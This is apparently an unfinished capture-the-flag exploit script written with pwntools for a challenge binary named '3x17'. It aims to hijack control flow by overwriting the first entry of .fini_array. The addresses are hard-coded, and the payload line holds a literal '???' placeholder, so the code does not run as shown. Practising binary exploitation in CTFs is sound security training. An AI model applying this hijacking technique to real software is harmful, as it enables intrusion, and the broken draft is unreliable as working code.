#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf = ELF('./3x17')

# Memory locations
fini_array = 0x4b40f0
write      = 0x446ec0
read       = 0x446e20

# Byte sequence alias
A8 = 8 * b'A'


def main():
    """
    _start -> __libc_start_main -> main

    int __libc_start_main(int (*main)(int, char **, char **), # rdi
                          int argc,                           # rsi
                          char **ubp_av,                      # rdx
                          void (*init)(void),                 # rcx
                          void (*fini)(void),                 # r8
                          void (*rtld_fini)(void),            # r9
                          void (*stack_end));                 # $rbp + 16

    Main idea: overwrite .fini_array's first element
               to hijack the control flow of the process.
    """
    # proc = remote('', )
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    proc.recvuntil('addr:')
    proc.send(str(fini_array).encode())

    proc.recvuntil('data:')
    proc.send(p64(???))

    proc.interactive()

if __name__ == '__main__':
    main()
